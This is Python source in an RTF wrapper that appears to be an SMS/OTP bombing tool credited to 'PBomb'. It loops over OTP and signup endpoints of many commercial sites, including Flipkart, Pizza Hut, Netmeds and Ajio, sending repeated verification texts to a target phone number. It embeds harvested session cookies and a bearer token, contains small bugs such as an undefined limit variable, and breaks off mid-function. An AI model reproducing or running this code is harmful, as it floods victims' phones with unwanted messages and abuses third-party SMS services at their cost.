{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil\fcharset1 Segoe UI Symbol;}}
{\colortbl ;\red0\green0\blue255;}
{\*\generator Riched20 6.3.9600}\viewkind4\uc1 
\pard\sa200\sl276\slmult1\f0\fs22\lang9 #!/usr/bin/env python\par
from datetime import datetime\par
import os\par
import hashlib\par
import sys\par
import time\par
import threading\par
import string\par
import random\par
import base64\par
import urllib.request\par
import urllib.parse\par
\par
try:\par
    import requests\par
except ImportError:\par
    print('[!] Error: some dependencies are not installed')\par
    print('Type \\'pip install -r requirements.txt\\' to install all required packages')\par
    exit()\par
\par
colors=['\\033[1;31m','\\033[1;32m','\\033[1;33m','\\033[1;34m','\\033[1;35m','\\033[1;36m']\par
W='\\033[0m'\par
# The Credit For This Code Goes To Panda Hackers And All Other Contributors Listed At {{\field{\*\fldinst{HYPERLINK https://github.com/HACK3RY2J/PBomb }}{\fldrslt{https://github.com/HACK3RY2J/PBomb\ul0\cf0}}}}\f0\fs22\par
# If You Wanna Take Credits For This Code, Please Look Yourself Again\par
\par
country_codes = \{\par
    '93': 'AF',\par
    '355': 'AL',\par
    '213': 'DZ',\par
    '376': 'AD',\par
    '244': 'AO',\par
    '672': 'AQ',\par
    '54': 'AR',\par
    '374': 'AM',\par
    '297': 'AW',\par
    '61': 'AU',\par
    '43': 'AT',\par
    '994': 'AZ',\par
    '973': 'BH',\par
    '880': 'BD',\par
    '375': 'BY',\par
    '32': 'BE',\par
    '501': 'BZ',\par
    '229': 'BJ',\par
    '975': 'BT',\par
    '591': 'BO',\par
    '387': 'BA',\par
    '267': 'BW',\par
    '55': 'BR',\par
    '246': 'IO',\par
    '673': 'BN',\par
    '359': 'BG',\par
    '226': 'BF',\par
    '257': 'BI',\par
    '855': 'KH',\par
    '237': 'CM',\par
    '238': 'CV',\par
    '236': 'CF',\par
    '235': 'TD',\par
    '56': 'CL',\par
    '86': 'CN',\par
    '57': 'CO',\par
    '269': 'KM',\par
    '682': 'CK',\par
    '506': 'CR',\par
    '385': 'HR',\par
    '53': 'CU',\par
    '599': 'AN',\par
    '357': 'CY',\par
    '420': 'CZ',\par
    '243': 'CD',\par
    '45': 'DK',\par
    '253': 'DJ',\par
    '670': 'TL',\par
    '593': 'EC',\par
    '20': 'EG',\par
    '503': 'SV',\par
    '240': 'GQ',\par
    '291': 'ER',\par
    '372': 'EE',\par
    '251': 'ET',\par
    '500': 'FK',\par
    '298': 'FO',\par
    '679': 'FJ',\par
    '358': 'FI',\par
    '33': 'FR',\par
    '689': 'PF',\par
    '241': 'GA',\par
    '220': 'GM',\par
    '995': 'GE',\par
    '49': 'DE',\par
    '233': 'GH',\par
    '350': 'GI',\par
    '30': 'GR',\par
    '299': 'GL',\par
    '502': 'GT',\par
    '224': 'GN',\par
    '245': 'GW',\par
    '592': 'GY',\par
    '509': 'HT',\par
    '504': 'HN',\par
    '852': 'HK',\par
    '36': 'HU',\par
    '354': 'IS',\par
    '91': 'IN',\par
    '62': 'ID',\par
    '98': 'IR',\par
    '964': 'IQ',\par
    '353': 'IE',\par
    '972': 'IL',\par
    '39': 'IT',\par
    '225': 'CI',\par
    '81': 'JP',\par
    '962': 'JO',\par
    '254': 'KE',\par
    '686': 'KI',\par
    '383': 'XK',\par
    '965': 'KW',\par
    '996': 'KG',\par
    '856': 'LA',\par
    '371': 'LV',\par
    '961': 'LB',\par
    '266': 'LS',\par
    '231': 'LR',\par
    '218': 'LY',\par
    '423': 'LI',\par
    '370': 'LT',\par
    '352': 'LU',\par
    '853': 'MO',\par
    '389': 'MK',\par
    '261': 'MG',\par
    '265': 'MW',\par
    '60': 'MY',\par
    '960': 'MV',\par
    '223': 'ML',\par
    '356': 'MT',\par
    '692': 'MH',\par
    '222': 'MR',\par
    '230': 'MU',\par
    '262': 'RE',\par
    '52': 'MX',\par
    '691': 'FM',\par
    '373': 'MD',\par
    '377': 'MC',\par
    '976': 'MN',\par
    '382': 'ME',\par
    '212': 'EH',\par
    '258': 'MZ',\par
    '95': 'MM',\par
    '264': 'NA',\par
    '674': 'NR',\par
    '977': 'NP',\par
    '31': 'NL',\par
    '687': 'NC',\par
    '64': 'NZ',\par
    '505': 'NI',\par
    '227': 'NE',\par
    '234': 'NG',\par
    '683': 'NU',\par
    '850': 'KP',\par
    '47': 'SJ',\par
    '968': 'OM',\par
    '92': 'PK',\par
    '680': 'PW',\par
    '970': 'PS',\par
    '507': 'PA',\par
    '675': 'PG',\par
    '595': 'PY',\par
    '51': 'PE',\par
    '63': 'PH',\par
    '48': 'PL',\par
    '351': 'PT',\par
    '974': 'QA',\par
    '242': 'CG',\par
    '40': 'RO',\par
    '7': 'RU',\par
    '250': 'RW',\par
    '590': 'MF',\par
    '290': 'SH',\par
    '508': 'PM',\par
    '685': 'WS',\par
    '378': 'SM',\par
    '239': 'ST',\par
    '966': 'SA',\par
    '221': 'SN',\par
    '381': 'RS',\par
    '248': 'SC',\par
    '232': 'SL',\par
    '65': 'SG',\par
    '421': 'SK',\par
    '386': 'SI',\par
    '677': 'SB',\par
    '252': 'SO',\par
    '27': 'ZA',\par
    '82': 'KR',\par
    '211': 'SS',\par
    '34': 'ES',\par
    '94': 'LK',\par
    '249': 'SD',\par
    '597': 'SR',\par
    '268': 'SZ',\par
    '46': 'SE',\par
    '41': 'CH',\par
    '963': 'SY',\par
    '886': 'TW',\par
    '992': 'TJ',\par
    '255': 'TZ',\par
    '66': 'TH',\par
    '228': 'TG',\par
    '690': 'TK',\par
    '676': 'TO',\par
    '216': 'TN',\par
    '90': 'TR',\par
    '993': 'TM',\par
    '688': 'TV',\par
    '256': 'UG',\par
    '380': 'UA',\par
    '971': 'AE',\par
    '44': 'GB',\par
    '1': 'US',\par
    '598': 'UY',\par
    '998': 'UZ',\par
    '678': 'VU',\par
    '379': 'VA',\par
    '58': 'VE',\par
    '84': 'VN',\par
    '681': 'WF',\par
    '967': 'YE',\par
    '260': 'ZM',\par
    '263': 'ZW'\par
\}\par
\par
\par
def clr():\par
    if os.name == 'nt':\par
        os.system('cls')\par
    else:\par
        os.system('clear')\par
def banner():\par
    \par
    clr()\par
    logo="""                                                  \par
   \f1\lang1033\u9608?\u9608?\u9608?\u9608?\u9608?\u9608?\u9608?\u9608?\f0  \f1\u9608?\u9608?\u9608?\u9608?\u9608?\u9608?\f0                  \f1\u9608?\u9608?\f0              \par
   \f1\u9618?\u9618?\u9618?\u9608?\u9608?\u9618?\u9618?\u9618?\f0  \f1\u9608?\u9608?\u9618?\u9618?\u9618?\u9608?\u9608?\f0                 \f1\u9608?\u9608?\f0              \par
      \f1\u9608?\u9608?\f0     \f1\u9608?\u9608?\f0    \f1\u9608?\u9608?\f0   \f1\u9608?\u9608?\u9608?\u9608?\f0   \f1\u9608?\u9608?\f0    \f1\u9608?\u9608?\f0  \f1\u9608?\u9608?\f0              \par

\pard\ri1260\sa200\sl276\slmult1\tx9180\tx10080       \f1\u9608?\u9608?\f0     \f1\u9608?\u9608?\u9608?\u9608?\u9608?\u9608?\u9618?\f0  \f1\u9608?\u9608?\u9618?\u9618?\u9608?\u9608?\f0  \f1\u9608?\u9608?\u9608?\f0  \f1\u9608?\u9608?\u9608?\f0  \f1\u9608?\u9608?\u9608?\u9608?\u9608?\f0           \par

\pard\sa200\sl276\slmult1       \f1\u9608?\u9608?\f0     \f1\u9608?\u9608?\u9618?\u9618?\u9618?\u9608?\u9608?\f0  \f1\u9608?\u9608?\f0   \f1\u9608?\u9608?\f0  \f1\u9608?\u9608?\u9618?\u9608?\u9618?\u9608?\u9608?\f0  \f1\u9608?\u9608?\u9618?\u9618?\u9608?\u9608?\f0          \par
      \f1\u9608?\u9608?\f0     \f1\u9608?\u9608?\f0    \f1\u9608?\u9608?\f0  \f1\u9608?\u9608?\f0   \f1\u9608?\u9608?\f0  \f1\u9608?\u9608?\f0  \f1\u9618?\f0  \f1\u9608?\u9608?\f0  \f1\u9608?\u9608?\f0   \f1\u9608?\u9608?\f0          \par
      \f1\u9608?\u9608?\f0     \f1\u9608?\u9608?\u9608?\u9608?\u9608?\u9608?\u9618?\f0  \f1\u9618?\u9608?\u9608?\u9608?\u9608?\u9618?\f0  \f1\u9608?\u9608?\f0    \f1\u9608?\u9608?\f0  \f1\u9608?\u9608?\u9608?\u9608?\u9608?\u9618?\f0          \par
      \f1\u9618?\u9618?\f0     \f1\u9618?\u9618?\u9618?\u9618?\u9618?\u9618?\f0    \f1\u9618?\u9618?\u9618?\u9618?\f0   \f1\u9618?\u9618?\f0    \f1\u9618?\u9618?\f0  \f1\u9618?\u9618?\u9618?\u9618?\u9618?\f0           \par

\pard\ri4680\sa200\sl276\slmult1\tx4860\tx5670\tx7290\tx9900                                          """\par

\pard\sa200\sl276\slmult1     print(random.choice(colors)+logo+W)\par
    print("\\n")\par
\par
\par
\par
count_inf = 0\par
\par
\par
def infinite(pn, dl, ch, max):\par
    global count_inf\par
    while True:\par
        while os.path.exists('proc.xxx'):\par
            time.sleep(0.5)\par
        os.system('touch proc.xxx')\par
        api = random.choice(ch)\par
        try:\par
            ret = getapi(pn, api, 91)\par
        except Exception:\par
            ret = False\par
        if not ret:\par
            while ch.count(api) > 0:\par
                ch.remove(api)\par
            continue\par
        os.system('rm proc.xxx >/dev/null 2>&1')\par
        count_inf += 1\par
        # os.system('echo Panda Hackers >> count.xxx')\par
        time.sleep(float(dl))\par
        if (count_inf > maxlim):\par
            exit()\par
\par
\par
def checkinternet():\par
    res = False\par
    try:\par
        requests.get('https://www.google.com', verify=True)\par
        res = False\par
    except Exception:\par
        res = True\par
    if res:\par
        print("\\n\\n\\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")\par
        print('\\t\\tPBomb Will Stop Now...\\n\\n')\par
        banner()\par
        exit()\par
\par
\par
def getapi(pn, lim, cc):\par
    global country_codes\par
    cc = str(cc).strip()\par
    cnn = country_codes[cc]\par
    lim = int(lim)\par
    url = ["{{\field{\*\fldinst{HYPERLINK https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B }}{\fldrslt{https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B\ul0\cf0}}}}\f0\fs22 " +\par
           str(cc) + "&nod=4&phone=" + pn, "{{\field{\*\fldinst{HYPERLINK https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo= }}{\fldrslt{https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=\ul0\cf0}}}}\f0\fs22 " + pn, "{{\field{\*\fldinst{HYPERLINK https://securedapi.confirmtkt.com/api/platform/register?mobileNumber= }}{\fldrslt{https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=\ul0\cf0}}}}\f0\fs22 " + pn]\par
    try:\par
        if lim < len(url):\par
            urllib.request.urlopen(str(url[lim]))\par
            return True\par
    except (urllib.error.HTTPError, urllib.error.URLError):\par
        return False\par
    if lim == 3:\par
        os.system('curl -s -X POST -H "Host:m.netmeds.com" -H "content-length:76" -H "accept:*/*" -H "origin:https://m.netmeds.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://m.netmeds.com/customer/account/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:checkmobileno-popup=quWqfunF" -H "cookie:section_data_ids=%7B%22cart%22%3A1559721914%2C%22directory-data%22%3A1559721853%7D" -H "cookie:mage-messages=" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:_gac_UA-63910444-1=1.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_gcl_aw=GCL.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_nmstracking=| sms | ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsUTMtrackingsource=ADW-CPC-Search-NMS-Brand-OC&ADW-CPC-Search-NMS-Brand-OC&CPC&ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsCampaign=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsMedium=CPC" -H "cookie:_nmsSource=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsAttr=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:private_content_version=eef016e2f8225f631d4a6e1cf8cdf4ac" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:form_key=YGWpwHiCN5uglOtY" -H "cookie:_gid=GA1.3.93227781.1559647218" -H "cookie:mage-translation-file-version=%7B%7D" -H "cookie:mage-translation-storage=%7B%7D" -H "cookie:_gcl_au=1.1.656472353.1559647214" -H "cookie:PHPSESSID=b5i36rg02l2jg9cielmm9fl7c6" -H "cookie:cto_lwid=e5917844-4f1b-48f9-bf74-b0bfdd5c79ce" -H "cookie:bsCoId=3558720339100" -H "cookie:bsUl=0" -H "cookie:_fbp=fb.1.1558720332185.799068042" -H "cookie:_ga=GA1.3.185497001.1558720330" -d \\'register_mobileno=' + pn + '&logintype=Otp&uniq_identy=quWqfunF&forget_pwd=N\\' "{{\field{\*\fldinst{HYPERLINK https://m.netmeds.com/sociallogin/popup/nmsgetcode/ }}{\fldrslt{https://m.netmeds.com/sociallogin/popup/nmsgetcode/\ul0\cf0}}}}\f0\fs22 "  > /dev/null 2>&1')\par
        return True\par
    elif lim == 4:\par
        os.system(\par
            'curl -s -X POST -H "Host:client-api.goomo.com" -H "origin:https://www.goomo.com" -H "client:m-web" -H "x-goomo-platform:mWeb" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.goomo.com/hotels" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -d \\'\{"email":"fakeemail@gmail.com","phone_number":"' + pn + '","country_code":"' + cc + '"\}\\' "{{\field{\*\fldinst{HYPERLINK https://client-api.goomo.com/v2/phone_confirmation/verify_user }}{\fldrslt{https://client-api.goomo.com/v2/phone_confirmation/verify_user\ul0\cf0}}}}\f0\fs22 " > /dev/null 2>&1')\par
        return True\par
    elif lim == 5:\par
        os.system('curl -s -X POST -H "Accept:*/*" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.5" -H "Connection:keep-alive" -H "Content-Length:34" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:www.oriyamatrimony.com" -H "Referer:https://www.oriyamatrimony.com/" -H "User-Agent:Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0" -H "X-Requested-With:XMLHttpRequest" -d "countrycode=' +\par
                  cc + '&mobileno=' + pn + '" "{{\field{\*\fldinst{HYPERLINK https://www.oriyamatrimony.com/login/mobileappsms-homepage.php }}{\fldrslt{https://www.oriyamatrimony.com/login/mobileappsms-homepage.php\ul0\cf0}}}}\f0\fs22 "  > /dev/null 2>&1')\par
        return True\par
    elif lim == 6:\par
        os.system(\par
            'curl -s -X POST -H "host:www.flipkart.com" -H "user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -H "accept:*/*" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.flipkart.com/" -H "x-user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop" -H "origin:https://www.flipkart.com" -H "connection:keep-alive" -H "Content-Type:application/json; charset=utf-8" -H "Content-Length:53" -d \\'\{"loginId":["+' + cc + pn + '"],"supportAllStates":true\}\\' "{{\field{\*\fldinst{HYPERLINK https://www.flipkart.com/api/6/user/signup/status }}{\fldrslt{https://www.flipkart.com/api/6/user/signup/status\ul0\cf0}}}}\f0\fs22 "  > /dev/null 2>&1')\par
        return True\par
    elif lim == 7:\par
        os.system('curl -s -X POST -H "Host:www.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:60" -H "X-user-agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop" -H "Origin:https://www.flipkart.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:T=BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050; SWAB=build-44be9e47461a74d737914207bcbafc30; lux_uid=155867904381892986; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_cc=true; SN=2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078; gpv_pn=HomePage; gpv_pn_t=Homepage; S=d1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==; s_sq=%5B%5BB%5D%5D" -d \\'loginId=+' + cc + pn + '&state=VERIFIED&churnEmailRequest=false\\' "{{\field{\*\fldinst{HYPERLINK https://www.flipkart.com/api/5/user/otp/generate }}{\fldrslt{https://www.flipkart.com/api/5/user/otp/generate\ul0\cf0}}}}\f0\fs22 "  > /dev/null 2>&1')\par
        return True\par
    elif lim == 8:\par
        os.system('curl -s -X POST -H "Host:www.ref-r.com" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Accept-Language:en-US,en;q=0.5" -H "Accept-Encoding:gzip, deflate, br" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With:XMLHttpRequest" -H "Content-Length:26" -H "DNT:1" -H "Connection:keep-alive" -d "mobile=' + pn + '&submit=1&undefined=" "{{\field{\*\fldinst{HYPERLINK https://www.ref-r.com/clients/lenskart/smsApi }}{\fldrslt{https://www.ref-r.com/clients/lenskart/smsApi\ul0\cf0}}}}\f0\fs22 "  > /dev/null 2>&1')\par
        return True\par
    elif lim == 9:\par
        rd = os.popen('curl -s -X POST -H "X-DROID-VERSION:4.12.5" -H "API-Version:2.0" -H "user-agent:samsung SM-G9350 0 4.4.2" -H "client-version:Android-4.12.5" -H "X-DROID-VERSION-CODE:158" -H "Accept:application/json" -H "client-name:Practo Android App" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:accounts.practo.com" -H "Connection:Keep-Alive" -H "Content-Length:96" -d  "client_name=Practo+Android+App&fingerprint=&mobile=%2B' + cc + pn + '&device_name=samsung+SM-G9350&"  "{{\field{\*\fldinst{HYPERLINK https://accounts.practo.com/send_otp }}{\fldrslt{https://accounts.practo.com/send_otp\ul0\cf0}}}}\f0\fs22 "').read()\par
        return rd.find("success") != -1\par
    elif lim == 10:\par
        os.system(\par
            'curl -s -X POST -H "Host:m.pizzahut.co.in" -H "content-length:114" -H "origin:https://m.pizzahut.co.in" -H "authorization:Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4" -H "x-source-origin:PWAFW" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "save-data:on" -H "languagecode:en" -H "referer:https://m.pizzahut.co.in/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_fbp=fb.2.1559973905081.1516144968" -H "cookie:_gat_UA-37858192-4=1" -H "cookie:_ga-ss=1|UA-37858192-4|https%3A%2F%2Fwww.google.com%2F" -H "cookie:_gid=GA1.3.1666290082.1559973902" -H "cookie:_ga=GA1.3.1893416092.1559973902" -H "cookie:run_fullstory_for_user=full_story_fail" -H "cookie:_gcl_au=1.1.2020385110.1559973902" -H "cookie:AKA_A2=A" -d \\'\{"customer":\{"MobileNo":"' + pn + '","UserName":"' + pn + '","merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"\}\}\\' "{{\field{\*\fldinst{HYPERLINK https://m.pizzahut.co.in/api/cart/send-otp?langCode=en }}{\fldrslt{https://m.pizzahut.co.in/api/cart/send-otp?langCode=en\ul0\cf0}}}}\f0\fs22 "  > /dev/null 2>&1')\par
        return True\par
    elif lim == 11:\par
        os.system('curl -s -X POST -H "host:www.goibibo.com" -H "user-agent:Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.goibibo.com/mobile/?sms=success" -H "content-type:application/x-www-form-urlencoded" -H "content-length:14" -H "connection:keep-alive" -H "upgrade-insecure-requests:1" -d "mbl=' + pn + '" "{{\field{\*\fldinst{HYPERLINK https://www.goibibo.com/common/downloadsms/ }}{\fldrslt{https://www.goibibo.com/common/downloadsms/\ul0\cf0}}}}\f0\fs22 "  > /dev/null 2>&1')\par
        return True\par
    elif lim == 12:\par
        os.popen('rm temp.xxx1 > /dev/null 2>&1')\par
        os.system(\par
            'curl -s -X POST -H "Host:www.apollopharmacy.in" -H "content-length:17" -H "accept:*/*" -H "origin:https://www.apollopharmacy.in" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.apollopharmacy.in/sociallogin/mobile/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:__cfduid=d64c65a2edad54086382759cdf599de901558686615" -H "cookie:_ga=GA1.2.1278908803.1558686621" -H "cookie:__ta_device=fAz8eA9Rx40yyIiB5mzvHt4apFaSkMBA" -H "cookie:_fbp=fb.1.1558686627127.655454618" -H "cookie:__stat="BLOCK"" -H "cookie:jv_visits_count_EXRKNIzFkV=1" -H "cookie:__stp=\{"visit":"returning","uuid":"d9a1c39d-efbd-4911-ac0e-6333455f9fbb"\}" -H "cookie:PHPSESSID=vnj2hvk8nga4v1m2hvlmvl88r4" -H "cookie:_gid=GA1.2.132668726.1560239715" -H "cookie:_gat=1" -H "cookie:__ta_visit=f5uvpYKu8EVmJAJmFGXMmXGSTiNQSWRS" -H "cookie:_gat_UA-31142855-1=1" -H "cookie:__ta_ping=1" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-messages=" -H "cookie:private_content_version=46e6c8611a9b0d06e662da50ca5cf311" -H "cookie:AWSALB=2177QHjXXrFgaem1w0FrBqZ2aoKrMhI+DibolJaee9cVOP4ZSV2LiLC3tks68ud4ERCydxa8kb4klbiI+VEnNQB0rsyins1USgvHcPOUoz2nySN3SC5G/wpAACIq" -H "cookie:section_data_ids=%7B%22cart%22%3A1560239751%7D" -d \\'mobile=' + pn + '\\' "{{\field{\*\fldinst{HYPERLINK https://www.apollopharmacy.in/sociallogin/mobile/sendotp/ }}{\fldrslt{https://www.apollopharmacy.in/sociallogin/mobile/sendotp/\ul0\cf0}}}}\f0\fs22 " --output temp.xxx1')\par
        while not os.path.exists('temp.xxx1'):\par
            time.sleep(0.1)\par
        rd = str(open('temp.xxx1', 'rb').read()) + " "\par
        return rd.find("sent") != -1\par
    elif lim == 13:\par
        rd = ' '\par
        try:\par
            rd = os.popen(\par
                ' curl -s -X POST -H "Host:www.ajio.com" -H "Connection:keep-alive" -H "Content-Length:144" -H "Accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:_ga=GA1.2.979928319.1560364071; _gid=GA1.2.666270216.1560364071; V=201; _fbp=fb.1.1560364076913.1528349725; cto_lwid=d91bea3a-7610-45aa-8f78-65a0d740fb46; PushSubscriberStatus=DENIED; peclosed=true; G_ENABLED_IDPS=google; TS018cc593=01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50; _gac_UA-68002030-1=1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB; cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C; ImpressionCookie=4; ip=10.1.10.1; sessionStatus=true|undefined; FirstPage=Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time); _dc_gtm_UA-68002030-1=1; uI=johnyaho%40gmail.com; TS01fe4249=01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c" -d \\'\{"firstName":"Rox","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"' + pn + '","requestType":"SENDOTP"\}\\' "{{\field{\*\fldinst{HYPERLINK https://www.ajio.com/api/auth/signupSendOTP }}{\fldrslt{https://www.ajio.com/api/auth/signupSendOTP\ul0\cf0}}}}\f0\fs22 " ').read()\par
        except Exception:\par
            return True\par
